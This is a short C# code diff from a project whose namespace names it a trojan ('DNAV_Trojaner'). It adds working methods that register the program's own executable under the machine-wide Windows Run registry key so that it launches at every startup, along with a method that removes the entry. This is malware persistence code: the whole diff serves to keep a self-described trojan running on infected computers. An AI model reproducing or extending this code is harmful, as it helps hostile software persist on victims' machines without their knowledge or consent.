@@ -17,5 +17,18 @@ namespace DNAV_Trojaner
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
             key.DeleteValue("DNAV", false);
         }
+
+        public static void EnableForAdmin()
+        {
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("DNAV", Application.ExecutablePath.ToString());
+            key.Close();
+        }
+
+        public static void DisableForAdmin()
+        {
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            key.DeleteValue("DNAV", false);
+        }
     }
 }
